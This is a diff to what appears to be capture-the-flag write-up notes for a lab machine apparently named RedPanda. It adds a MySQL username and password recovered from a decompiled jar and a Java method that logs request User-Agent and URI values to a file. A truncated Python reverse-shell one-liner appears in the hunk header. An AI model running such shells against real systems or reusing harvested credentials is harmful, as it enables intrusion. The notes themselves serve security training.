@@ -139,4 +139,22 @@ python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STRE
 ```
 
 ### Interesting files
-/opt/
+/opt/panda_search
+
+### In decompiled jar:
+- MySQL credentials: `woodenk:RedPandazRule`
+- Logger file in decompiled (RequestInterceptor.class) :
+```java
+public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
+    System.out.println("interceptor#postHandle called. Thread: " + Thread.currentThread().getName());
+    String UserAgent = request.getHeader("User-Agent");
+    String remoteAddr = request.getRemoteAddr();
+    String requestUri = request.getRequestURI();
+    Integer responseCode = Integer.valueOf(response.getStatus());
+    System.out.println("LOG: " + responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri);
+    FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
+    BufferedWriter bw = new BufferedWriter(fw);
+    bw.write(responseCode.toString() + "||" + responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "\n");
+    bw.close();
+  }
+``` 
